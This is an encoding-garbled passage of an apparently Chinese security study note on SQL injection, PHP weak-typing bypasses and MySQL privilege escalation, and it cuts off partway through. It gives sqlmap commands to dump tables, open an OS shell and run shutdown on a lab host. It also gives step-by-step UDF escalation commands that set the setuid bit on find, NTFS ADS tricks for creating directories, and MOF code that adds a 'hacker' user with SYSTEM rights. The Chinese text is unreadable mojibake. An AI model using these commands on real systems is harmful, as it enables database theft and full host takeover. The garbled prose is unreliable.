<p>uncè·¯å¾„ï¼Œæ˜¯åœ¨windowså¹³å°ä¸Šè®¿é—®å±€åŸŸç½‘ç½‘ç»œèµ„æºçš„ä¸€ç§è·¯å¾„è¡¨ç¤ºæ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨windowä¸Šä½¿ç”¨çš„æ–‡ä»¶å…±äº«æœåŠ¡è·¯å¾„å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ï¼Œ<code>\\172.16.11.24</code> è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆåªèƒ½åœ¨windowå¹³å°çš„æœåŠ¡å™¨ä¸Šæœ‰æ•ˆï¼Œå¦å¤–å¤šå‡ºæ¥çš„ä¸¤ä¸ª<code>\</code>è¡¨ç¤ºè½¬ä¹‰ã€‚</p>
<p><code>load_file</code> å—mysqlé…ç½®æ–‡ä»¶ä¸­<code>secure_file_priv</code>é€‰é¡¹çš„é™åˆ¶ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secure_file_priv= //å…è®¸æ‰€æœ‰secure_file_priv=&quot;G:\&quot; //å…è®¸åŠ è½½Gç›˜secure_file_priv=null //æ‹’ç»</span><br></pre></td></tr></table></figure>

<h2 id="SQLIå·²æ­»â€”â€”SQLé¢„ç¼–è¯‘"><a href="#SQLIå·²æ­»â€”â€”SQLé¢„ç¼–è¯‘" class="headerlink" title="SQLIå·²æ­»â€”â€”SQLé¢„ç¼–è¯‘"></a>SQLIå·²æ­»â€”â€”SQLé¢„ç¼–è¯‘</h2><p>sqlæ³¨å…¥å­˜åœ¨çš„åŸå› æ˜¯è®¡ç®—æœºå¯¹ä»£ç éƒ¨åˆ†ã€ä¸æ•°æ®éƒ¨åˆ†åŒºåˆ†é”™è¯¯å¯¼è‡´çš„ã€‚</p>
<p>sqlè¯­å¥åœ¨æ‰§è¡Œä¹‹å‰ä¼šè¿›è¡Œè¯æ³•åˆ†æã€è¯­ä¹‰åˆ†æï¼Œå½“ä»£ç ä¸­æœ‰å¤§é‡çš„é‡å¤è¯­å¥çš„æ—¶å€™ï¼Œå°±ä¼šæµªè´¹å¤§é‡çš„èµ„æºï¼Œæ‰€ä»¥æœ‰äº†é¢„ç¼–è¯‘çš„æ¦‚å¿µã€‚åœ¨sqlè¯­å¥æ‰§è¡Œå‰ï¼Œsqlè¯­å¥è¢«é¢„ç¼–è¯‘ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤ç”¨åŒä¸€æ¡sqlè¯­å¥ï¼Œè€Œä¸éœ€è¦æ¯æ¬¡æ‰§è¡Œsqlè¯­å¥çš„æ—¶å€™éƒ½è¿›è¡Œè¯æ³•åˆ†æä¸è¯­ä¹‰åˆ†æï¼ŒåŒæ—¶æ— è®ºæˆ‘ä»¬è¾“å…¥çš„å†…å®¹æ˜¯ä»€ä¹ˆéƒ½ä¼šè¢«å½“ä½œå­—ç¬¦ä¸²ï¼Œè€Œä¸ä¼šè¢«å½“ä½œä»£ç éƒ¨åˆ†è¢«æ‰§è¡Œã€‚å½“ç„¶é¢„ç¼–è¯‘ä¹Ÿå­˜åœ¨å±€é™æ€§ï¼Œé¢„ç¼–è¯‘åªèƒ½ç¼–è¯‘sqlçš„å‚æ•°éƒ¨åˆ†ï¼Œè€Œä¸èƒ½ç¼–è¯‘sqlçš„ç»“æ„éƒ¨åˆ†ï¼Œæ‰€ä»¥å½“ç»“æ„éƒ¨åˆ†è¯­å¥éœ€è¦åŠ¨æ€ç”Ÿæˆçš„æ—¶å€™å°±ä¸èƒ½ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œè¿™æ ·å°±å¯èƒ½å­˜åœ¨sqlæ³¨å…¥çš„é—®é¢˜ã€‚å†æœ‰é¢„ç¼–è¯‘çš„è¯­å¥ä¹Ÿå¹¶ä¸æ˜¯æ— é‚ªå¯ä»¥ï¼Œå‚æ•°éƒ¨åˆ†è¿˜æ˜¯å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹çš„ï¼Œå¦‚likeå­å¥ä¸­ç”¨ä¸º%åœ¨sqlä¸­æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬è¿˜æ˜¯æœ‰å¯èƒ½ç²¾å¿ƒæ„é€ ä¸€æ¡sqlè¯­å¥çš„ã€‚</p>
<h1 id="PHPç‰¹æ€§"><a href="#PHPç‰¹æ€§" class="headerlink" title="PHPç‰¹æ€§"></a>PHPç‰¹æ€§</h1><p><a href="https://blog.csdn.net/he_and/article/details/78461896?spm=1001.2014.3001.5501">ctfä¸­phpå¸¸è§çš„è€ƒç‚¹_ä¸€ä¸ªå®‰å…¨ç ”ç©¶å‘˜-CSDNåšå®¢_ctfphp</a></p>
<h2 id="å˜é‡é»˜è®¤å€¼"><a href="#å˜é‡é»˜è®¤å€¼" class="headerlink" title="å˜é‡é»˜è®¤å€¼"></a>å˜é‡é»˜è®¤å€¼</h2><p>å½“å®šä¹‰ä¸€ä¸ªå˜é‡æ—¶ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å€¼ï¼Œåˆ™è¯¥å˜é‡ä¼šè¢«é»˜è®¤è®¾ç½®ä¸º0</p>
<p>å¦‚</p>
<p><a href="http://domain/test.php?name%5B%5D=hjx&password%5B%5D=hjx123456">http://domain/test.php?name[]=hjx&amp;password[]=hjx123456</a></p>
<p>æ­¤æ—¶$_GET[name]&#x3D;[hjx] $_GET[password]&#x3D;[â€˜hjx123456â€™] _POSTåŒæ ·å­˜åœ¨è¯¥ç‰¹æ€§</p>
<h2 id="å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§"><a href="#å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§" class="headerlink" title="å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§"></a>å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¿”å›0</p>
<ul>
<li>5.2 ä¸­æ˜¯å°†ä¸¤ä¸ªå‚æ•°å…ˆè½¬æ¢æˆstringç±»å‹ã€‚</li>
<li>5.3.3 ä»¥åï¼Œå½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯0ã€‚</li>
<li>5.5 ä¸­å¦‚æœå‚æ•°ä¸æ˜¯stringç±»å‹ï¼Œç›´æ¥returnäº†</li>
</ul>
<p>å¯ç»“åˆä¸Šè¿°å˜é‡é»˜è®¤å€¼çš„ç‰¹æ€§è¿›è¡Œæ¸—é€</p>
<p>md5 ä¸ sha1</p>
<p>md5ä¸sha1å‡½æ•°ä¸èƒ½æ¯”è¾ƒæ•°ç»„,å¦‚æœå€¼ä¸ºæ•°ç»„ï¼Œç›´æ¥è¿”å›false</p>
<p>sha1([â€˜hjx123456â€™])&#x3D;&#x3D;&#x3D;false</p>
<p>md5([]) &#x3D;&#x3D;&#x3D; false</p>
<p>è½¬æ¢çš„ç»“æœå¦‚æœå­˜åœ¨0eå¼€å¤´çš„åé¢å…¨æ˜¯æ•°å­—çš„å€¼ï¼Œåˆ™åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ä¼šè¢«å½“åšç§‘å­¦è®¡æ•°æ³•è¿›è¡Œæ¯”è¾ƒï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªåŒæ ·ä»¥0eå¼€å¤´åé¢æ¥æ•°ç»„çš„å€¼å°±å¯é¡ºåˆ©ç»•è¿‡</p>
<p>md5(value,true) &#x2F;&#x2F;è¿™ç§è½¬æ¢ç»“æœä¼šç”Ÿæˆä¸€ä¸ª16ä½åŸå§‹äºŒè¿›åˆ¶å€¼ï¼Œæ­¤æ—¶å¦‚æœè½¬ååçš„å€¼çš„å‰é¢å­˜åœ¨â€™orâ€™çš„è¯å°±å¯ä»¥æ„é€ è¯­å¥</p>
<p>å¼±ç±»å‹</p>
<p>å½“ä¸€ä¸ªæ•´å‹å’Œå…¶ä»–ç±»å‹æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹ä½¿ç”¨intvalè½¬æ¢è½¬æ¢ä¸ºæ•´å‹åœ¨è¿›è¡Œæ¯”è¾ƒ</p>
<p>intval</p>
<p>intval åœ¨å¤„ç†éæ•´å‹æ•°æ®çš„æ—¶å€™ï¼Œä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ï¼Œç›´æ¥é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ï¼šå¦‚ï¼Œintval(â€˜234abaâ€™)&#x3D;&#x3D;&#x3D;234 <a href="//true">&#x2F;&#x2F;true</a> ,é‡åˆ°æ— æ³•è½¬è½¬çš„å­—ç¬¦ä¸²ï¼Œintvalä¸ä¼šæŠ¥é”™ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›0</p>
<p>is_numeric</p>
<p>PHPæä¾›äº†is_numericå‡½æ•°ï¼Œç”¨æ¥å˜é‡åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚ä½†æ˜¯å‡½æ•°çš„èŒƒå›´æ¯”è¾ƒå¹¿æ³›ï¼Œä¸ä»…ä»…æ˜¯åè¿›åˆ¶çš„æ•°å­—,å…«è¿›åˆ¶ï¼Œåå…­è¿›åˆ¶å‡å¯</p>
<p>in_array</p>
<p>æŸ¥æŸä¸€ä¸ªå€¼æ˜¯å¦åœ¨æ•°ç»„ä¸­ï¼Œå½“å€¼ä¸ä¸ºæ•°å­—çš„æ—¶å€™ï¼Œä¼šè¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢ï¼Œè½¬æ¢åŸåˆ™åŒintval</p>
<p>preg_match</p>
<p>åŒ¹é…çš„æ—¶å€™å¦‚æœæ²¡æœ‰é™åˆ¶å¼€å§‹ä¸ç»“å°¾ï¼Œåˆ™å¯èƒ½å­˜åœ¨ç»•è¿‡é—®é¢˜</p>
<p>å¦‚ï¼šåŒ¹é…ipåœ°å€çš„æ—¶å€™ï¼Œ1.1.1.1 union è¿™æ ·çš„è¯­å¥ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡çš„</p>
<p>egrep</p>
<p>è¯¥å‘½ä»¤åœ¨ç¢°åˆ°%00çš„æ—¶å€™ä¼šè¢«æˆªæ–­</p>
<p>make_set(â€œ3â€,str1,str2,str3)</p>
<p>è¯¥å‡½æ•°å°†3è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ä¸º0011ï¼Œåè¿‡æ¥å°±æ˜¯1100ï¼Œç¬¬ä¸€ä½1å¯¹åº”str1,ç¬¬äºŒä½1å¯¹åº”str2,ä»¥æ­¤ç±»æ¨ï¼Œå½“æŸäº›å‡½æ•°è¢«è¿‡æ»¤ä¹‹åå¯ä»¥é€šè¿‡è¯¥å‡½æ•°æ¥ç»•è¿‡</p>
<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="è·å–å½“å‰æ•°æ®åº“å"><a href="#è·å–å½“å‰æ•°æ®åº“å" class="headerlink" title="è·å–å½“å‰æ•°æ®åº“å"></a>è·å–å½“å‰æ•°æ®åº“å</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --current-db</span><br></pre></td></tr></table></figure>

<h3 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security --tables</span><br></pre></td></tr></table></figure>

<h3 id="è·å–å­—æ®µå"><a href="#è·å–å­—æ®µå" class="headerlink" title="è·å–å­—æ®µå"></a>è·å–å­—æ®µå</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --columns</span><br></pre></td></tr></table></figure>

<h3 id="è·å–è¡¨ä¸­æ•°æ®"><a href="#è·å–è¡¨ä¸­æ•°æ®" class="headerlink" title="è·å–è¡¨ä¸­æ•°æ®"></a>è·å–è¡¨ä¸­æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --dumpæˆ–è€…dump-all //è·å–å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„è®°å½•</span><br></pre></td></tr></table></figure>

<h3 id="è·å–sql-shell"><a href="#è·å–sql-shell" class="headerlink" title="è·å–sql-shell"></a>è·å–sql-shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --sql-shell//è·å–ä¸€ä¸ªsql-shellç¯å¢ƒ åŠŸèƒ½å—é™ï¼Œåªèƒ½æŸ¥.....</span><br></pre></td></tr></table></figure>

<h3 id="è·å–os-shell"><a href="#è·å–os-shell" class="headerlink" title="è·å–os-shell"></a>è·å–os-shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --os-shell</span><br></pre></td></tr></table></figure>

<h3 id="æ‰§è¡Œoså‘½ä»¤"><a href="#æ‰§è¡Œoså‘½ä»¤" class="headerlink" title="æ‰§è¡Œoså‘½ä»¤"></a>æ‰§è¡Œoså‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --os-cmd=shutdown</span><br></pre></td></tr></table></figure>

<h2 id="å…¶ä»–å¸¸ç”¨æŒ‡ä»¤"><a href="#å…¶ä»–å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å…¶ä»–å¸¸ç”¨æŒ‡ä»¤"></a>å…¶ä»–å¸¸ç”¨æŒ‡ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method post|get--data &quot;uname=123&amp;passwd=123&quot;  //æŒ‡å®špostè¡¨å•ä¸Šä¼ çš„æ•°æ®</span><br><span class="line">-p uname //æŒ‡å®šæ³¨å…¥çš„å­—æ®µ</span><br><span class="line">--technique=B //åŸºäºå¸ƒå°”çš„ç›²æ³¨    </span><br><span class="line">T //æ—¶é—´    </span><br><span class="line">E // error    </span><br><span class="line">U //union    </span><br><span class="line">S //å¤šè¯­å¥æŸ¥è¯¢</span><br><span class="line">-m 1.txt //ä»æ–‡ä»¶ä¸­è·å–å¤šä¸ªurl</span><br><span class="line">-r url.txt //ä»æ–‡ä»¶ä¸­åŠ è½½httpè¯·æ±‚</span><br><span class="line">-g &quot;inurl:\.php?id=1\&quot; googlehacking--form //è¿™æ ·å°±ä¸éœ€è¦æŒ‡å®š--dataäº†ï¼Œè½¯ä»¶ä¼šè‡ªåŠ¨å»å¯»æ‰¾è¡¨å•ã€‚get/postæ–¹æ³•å‡å¯</span><br><span class="line">--dbs //æšä¸¾æ‰€æœ‰çš„æ•°æ®åº“</span><br><span class="line">--users //æ‰€æœ‰ç”¨æˆ·</span><br><span class="line">--current-user //å½“å‰ç”¨æˆ·</span><br><span class="line">--passwords //æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„å¯†ç </span><br><span class="line">--privileges //æšä¸¾DMBMSçš„ç”¨æˆ·æƒé™</span><br><span class="line">--roles //æšä¸¾DBMSç”¨æˆ·çš„è§’è‰²</span><br><span class="line">--file-read--file-write</span><br></pre></td></tr></table></figure>

<h1 id="UDFææƒ"><a href="#UDFææƒ" class="headerlink" title="UDFææƒ"></a>UDFææƒ</h1><p><a href="https://blog.csdn.net/qq_43430261/article/details/107258466">udfææƒ_GitCloudçš„åšå®¢-CSDNåšå®¢</a></p>
<p>udfâ€”â€”ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</p>
<p>é€šè¿‡è‡ªå®šä¹‰mysqlå‡½æ•°ï¼Œå¯¹mysqlçš„åŠŸèƒ½è¿›è¡Œæ‰©å……ï¼Œæ·»åŠ çš„å‡½æ•°å¯ä»¥é¡¹mysqlçš„å†…ç½®å‡½æ•°ä¸€æ ·è¢«è°ƒç”¨æ‰§è¡Œï¼Œmysqlçš„ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°å­˜æ”¾mysqlæ ¹ç›®å½•ä¸‹çš„&#x2F;mysql&#x2F;lib&#x2F;pluginé‡Œé¢ï¼Œè¿™é‡Œé¢å­˜å‚¨ç€mysqlçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚æˆ‘ä»¬è®²è‡ªå®šä¹‰çš„åº“æ–‡ä»¶æ”¾è¿›å»åï¼Œè¿˜æœ‰å†mysqlä¸­æ‰§è¡Œ<code>create FUNVTION function_name RETURNS STRING SONAME &#39;udf.dll&#39;</code> å‘½ä»¤å°†è¯¥åº“æ–‡ä»¶ä¸­çš„å‡½æ•°å¯¼å…¥ï¼Œæ‰èƒ½ä½¿ç”¨è¯¥å‡½æ•°ï¼Œå°±åƒpythoné‡Œé¢çš„å¯¼å…¥æ¨¡å—ã€æ–¹æ³•ä¸€æ ·çš„</p>
<p>è¿™ä¸ª<code>udf.dll</code> ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±ç¼–å†™ï¼Œæˆ‘ä»¬ä¹Ÿæ²¡æœ‰å“ªä¸ªæœ¬äº‹ï¼Œå¯ä»¥åˆ©ç”¨sqlmapä¸ºæˆ‘ä»¬æä¾›çš„ã€‚</p>
<p>è¿›è¡Œudfææƒçš„å‰ææ˜¯æˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªç½‘ç«™çš„webshelläº†,è·å¾—webshellåï¼Œå°±å¯ä»¥å†ç½‘ç«™çš„ä¸»ç›®å½•ä¸‹çš„config.phpæ–‡ä»¶é‡Œé¢ï¼ˆä¸€èˆ¬éƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å®šä¹‰äº†æ•°æ®åº“çš„ç”¨æˆ·åå¯†ç ï¼‰æŸ¥çœ‹æ•°æ®åº“çš„ç”¨æˆ·åä¸å¯†ç </p>
<h2 id="æ”»å‡»è¿‡ç¨‹"><a href="#æ”»å‡»è¿‡ç¨‹" class="headerlink" title="æ”»å‡»è¿‡ç¨‹"></a>æ”»å‡»è¿‡ç¨‹</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p &#x27;R@v3nSecurity&#x27; # è¿›å…¥mysqluse mysql;   </span><br><span class="line"># åˆ‡æ¢æ•°æ®åº“</span><br><span class="line">create table foo (line blob); </span><br><span class="line"># æ–°å»ºä¸€ä¸ªè¡¨ï¼Œç”¨æ¥å­˜æ”¾æœ¬åœ°ä¼ æ¥çš„udfæ–‡ä»¶çš„å†…å®¹</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;)); </span><br><span class="line"># åœ¨fooä¸­å†™å…¥udfæ–‡ä»¶å†…å®¹</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;  </span><br><span class="line"># å°†udfæ–‡ä»¶å†…å®¹ä¼ å…¥æ–°å»ºçš„udfæ–‡ä»¶ä¸­,è¿™é‡Œçš„dumpfileè¦å’Œç”¨linEnum.shæŸ¥çœ‹çš„mysqlçš„è·¯å¾„ä¸€è‡´</span><br><span class="line"># windowsä¸­ï¼Œå¯¹äºmysqlå°äº5.1çš„ï¼Œå¯¼å‡ºç›®å½•ä¸ºC:\Windows\æˆ–C:\Windows\System32\ï¼Œlinuxä¸­ï¼Œ5.1ä»¥ä¸Šlib\plugin</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;; </span><br><span class="line"># å¯¼å…¥udfå‡½æ•°select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);create table foo(line blob);</span><br><span class="line"># ç»™ find å‘½ä»¤åŠ ä¸Š setuid çš„æ ‡å¿—ï¼Œç„¶åè°ƒç”¨findçš„-execæŒ‡ä»¤æ¥æ‰§è¡Œå‘½ä»¤quit; </span><br><span class="line"># é€€å‡ºmysql</span><br></pre></td></tr></table></figure>

<p><strong>ææƒæ–‡ä»¶è·¯å¾„ï¼š</strong></p>
<p>sqlmap:<code>/usr/share/sqlmap/data/udf/mysql/linux/64/</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%202.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%202.png</p>
<p>metasploit:<code>/usr/share/metasploit-framework/data/exploits/mysql</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%203.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%203.png</p>
<p><strong>linuxä¸­mysqlæ’ä»¶è·¯åŠ²ï¼š</strong></p>
<p><code>/usr/lib/x86_64-linux-gun/mariadb19/plugin</code></p>
<p>æˆ–è€…åœ¨æ•°æ®åº“ä¸­é€šè¿‡<code>select @@plugin_dir</code> æŸ¥çœ‹</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%204.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%204.png</p>
<p>æ’ä»¶ç›®å½•é»˜è®¤æ˜¯ä¸å­˜åœ¨çš„ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºï¼Œå½“æ—¶sqlç”¨æˆ·å¾€å¾€å¹¶ä¸å…·å¤‡åˆ›å»ºæ–‡ä»¶å¤¹çš„æƒé™ï¼Œæ•…åœ¨windowsç³»ç»Ÿä¸‹ï¼Œå¯ä»¥é€šè¿‡adså¤‡ä»½æ–‡æ¡£æµçš„æ–¹å¼ç»•è¿‡ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>; <span class="operator">/</span><span class="operator">/</span>æŸ¥æ‰¾åˆ°mysqlçš„ç›®å½•</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½•</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;<span class="operator">/</span><span class="operator">/</span>åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½•</span><br></pre></td></tr></table></figure>

<p><strong>æ³¨æ„:</strong></p>
<p>sqlmapä¸­çš„å››ä¸ªåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ˜¯åŠ è¿‡å¯†çš„ï¼Œéœ€è¦åœ¨&#x2F;sqlmap&#x2F;extra&#x2F;cloakç›®å½•ä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤æ‰èƒ½ç”Ÿæ•ˆã€‚</p>
<p><code>python .\cloak.py -d -i ..\..\data\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%205.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%205.png</p>
<p><strong>å¤åˆ¶soæ–‡ä»¶åˆ°mysqlæ’ä»¶ç›®å½•</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%206.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%206.png</p>
<p><strong>åœ¨idaä¸­æŸ¥çœ‹soæ–‡ä»¶ä¸­çš„å‡½æ•°</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%207.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%207.png</p>
<p><strong>åœ¨mysqlä¸­å¯¼å…¥åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%208.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%208.png</p>
<p><strong>æµ‹è¯•è¯¥å‡½æ•°</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%209.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%209.png</p>
<p><strong>æµ‹è¯•ç»“æœ</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%2010.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%2010.png</p>
<h2 id="MOFææƒ"><a href="#MOFææƒ" class="headerlink" title="MOFææƒ"></a>MOFææƒ</h2><p>ä»…é™windows å’Œwindows server2003ä»¥ä¸‹</p>
<p><code>c:\windows\system32\wbem\mof\nullevt.mof</code> æ¯éš”ä¸€åˆ†é’Ÿå°±ä¼šä»¥Systemèº«ä»½æ‰§è¡Œä¸€æ¬¡ï¼Œäºæ˜¯æˆ‘ä»¬æƒ³åŠæ³•å°†è¿™ä¸ªæ–‡ä»¶æ›¿æ¢æ‰æˆæˆ‘ä»¬æƒ³è¦çš„ä»£ç å°±okäº†ã€‚é‚£ä¹ˆè¦é¦–å…ˆææƒï¼Œæˆ‘ä»¬å°±å¿…é¡»è¦æ»¡è¶³ä»¥ä¸‹çš„æ¡ä»¶</p>
<p>é¦–å…ˆæˆ‘ä¹ˆä»¬å·²ç»è·å–äº†ä»¥rootæƒé™è¿è¡Œçš„sqlshellï¼Œrootç”¨æˆ·è¯»è¯¥ç›®å½•å…·æœ‰å†™çš„æƒé™ï¼Œapacheçš„secure-file-privå¤„äºæ²¡æœ‰å¯¹è®¿é—®ç›®å½•åšé™åˆ¶ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹</p>
<p><code>show global variables like &#39;%secure_file_priv%&#39;</code></p>
<p>å¦‚æœä¸Šè¿°æ¡ä»¶æ»¡è¶³åˆ™å¯ä»¥å°è¯•æ‰§è¡Œ</p>
<p>select load_file(â€˜mofææƒæ–‡ä»¶è·¯å¾„â€™) into dumpfile â€˜<code>c:\windows\system32\wbem\mof\nullevt.mof</code>â€™</p>
<p>mofæ–‡ä»¶ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pragma <span class="title function_ invoke__">namespace</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter <span class="keyword">as</span> <span class="variable">$EventFilter</span></span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>;</span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>;</span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span></span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span></span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>;</span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer <span class="keyword">as</span> <span class="variable">$Consumer</span></span><br><span class="line">&#123;</span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>;</span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>;</span><br><span class="line">    ScriptText =</span><br><span class="line">    <span class="string">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;**net user hacker 123456 /add**\&quot;)&quot;</span>;</span><br><span class="line">    <span class="comment">//cmdä»¥systemæƒé™æ‰§è¡Œçš„è¯­å¥</span></span><br><span class="line">&#125;;</span><br><span 